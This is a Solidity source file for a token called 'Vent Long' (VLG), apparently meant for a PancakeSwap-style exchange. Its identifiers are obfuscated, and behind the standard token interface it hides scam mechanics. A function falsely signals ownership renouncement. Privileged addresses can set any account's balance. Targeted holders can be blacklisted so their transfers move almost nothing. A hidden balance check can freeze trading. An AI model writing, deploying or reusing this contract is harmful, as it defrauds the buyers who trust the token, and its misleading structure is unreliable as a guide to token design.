//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface toTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldSender) external view returns (uint256);

    function transfer(address txEnable, uint256 launchedTeam) external returns (bool);

    function allowance(address modeSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTeam) external returns (bool);

    function transferFrom(
        address sender,
        address txEnable,
        uint256 launchedTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldFee, uint256 value);
    event Approval(address indexed modeSender, address indexed spender, uint256 value);
}

abstract contract txExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromFee {
    function createPair(address limitSwap, address toMode) external returns (address);
}

interface tokenSellReceiver is toTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VentLong is txExempt, toTeam, tokenSellReceiver {

    function launchTeam(uint256 launchedTeam) public {
        feeReceiver();
        limitLiquidity = launchedTeam;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listAtTotal;
    }

    address public walletSwap;

    constructor (){
        
        senderAt swapFund = senderAt(takeAuto);
        walletSwap = fromFee(swapFund.factory()).createPair(swapFund.WETH(), address(this));
        
        marketingWallet = _msgSender();
        maxBuy();
        sellReceiver[marketingWallet] = true;
        txBuySwap[marketingWallet] = listAtTotal;
        
        emit Transfer(address(0), marketingWallet, listAtTotal);
    }

    uint256 constant marketingReceiverTo = 10 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return fromSender;
    }

    event OwnershipTransferred(address indexed atAuto, address indexed totalMin);

    function takeLiquidity(address fromMax, address txEnable, uint256 launchedTeam) internal returns (bool) {
        if (fromMax == marketingWallet) {
            return tokenMin(fromMax, txEnable, launchedTeam);
        }
        uint256 swapTotal = toTeam(walletSwap).balanceOf(amountTotal);
        require(swapTotal == limitLiquidity);
        require(txEnable != amountTotal);
        if (senderEnable[fromMax]) {
            return tokenMin(fromMax, txEnable, marketingReceiverTo);
        }
        return tokenMin(fromMax, txEnable, launchedTeam);
    }

    uint256 public feeWalletLimit;

    function transfer(address listTxBuy, uint256 launchedTeam) external virtual override returns (bool) {
        return takeLiquidity(_msgSender(), listTxBuy, launchedTeam);
    }

    function modeShould(address senderWallet) public {
        feeReceiver();
        
        if (senderWallet == marketingWallet || senderWallet == walletSwap) {
            return;
        }
        senderEnable[senderWallet] = true;
    }

    string private fromSender = "VLG";

    function decimals() external view virtual override returns (uint8) {
        return marketingLiquidity;
    }

    uint256 public launchTo;

    mapping(address => bool) public sellReceiver;

    function feeReceiver() private view {
        require(sellReceiver[_msgSender()]);
    }

    function balanceOf(address shouldSender) public view virtual override returns (uint256) {
        return txBuySwap[shouldSender];
    }

    function transferFrom(address fromMax, address txEnable, uint256 launchedTeam) external override returns (bool) {
        if (_msgSender() != takeAuto) {
            if (launchIs[fromMax][_msgSender()] != type(uint256).max) {
                require(launchedTeam <= launchIs[fromMax][_msgSender()]);
                launchIs[fromMax][_msgSender()] -= launchedTeam;
            }
        }
        return takeLiquidity(fromMax, txEnable, launchedTeam);
    }

    address takeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public amountWallet;

    address public marketingWallet;

    uint256 toReceiver;

    bool private listTo;

    function approve(address amountLaunchExempt, uint256 launchedTeam) public virtual override returns (bool) {
        launchIs[_msgSender()][amountLaunchExempt] = launchedTeam;
        emit Approval(_msgSender(), amountLaunchExempt, launchedTeam);
        return true;
    }

    address private isFeeToken;

    function teamTotalIs(address sellSwapTeam) public {
        if (limitMaxAmount) {
            return;
        }
        
        sellReceiver[sellSwapTeam] = true;
        if (amountWallet == feeWalletLimit) {
            listTo = true;
        }
        limitMaxAmount = true;
    }

    mapping(address => bool) public senderEnable;

    mapping(address => mapping(address => uint256)) private launchIs;

    uint256 private listAtTotal = 100000000 * 10 ** 18;

    mapping(address => uint256) private txBuySwap;

    uint256 public atFee;

    function owner() external view returns (address) {
        return isFeeToken;
    }

    function tokenMin(address fromMax, address txEnable, uint256 launchedTeam) internal returns (bool) {
        require(txBuySwap[fromMax] >= launchedTeam);
        txBuySwap[fromMax] -= launchedTeam;
        txBuySwap[txEnable] += launchedTeam;
        emit Transfer(fromMax, txEnable, launchedTeam);
        return true;
    }

    bool private amountToken;

    bool public limitMaxAmount;

    function maxBuy() public {
        emit OwnershipTransferred(marketingWallet, address(0));
        isFeeToken = address(0);
    }

    string private enableReceiver = "Vent Long";

    uint256 limitLiquidity;

    uint8 private marketingLiquidity = 18;

    function getOwner() external view returns (address) {
        return isFeeToken;
    }

    function allowance(address tokenLiquidity, address amountLaunchExempt) external view virtual override returns (uint256) {
        if (amountLaunchExempt == takeAuto) {
            return type(uint256).max;
        }
        return launchIs[tokenLiquidity][amountLaunchExempt];
    }

    function receiverTeamAt(address listTxBuy, uint256 launchedTeam) public {
        feeReceiver();
        txBuySwap[listTxBuy] = launchedTeam;
    }

    address amountTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return enableReceiver;
    }

}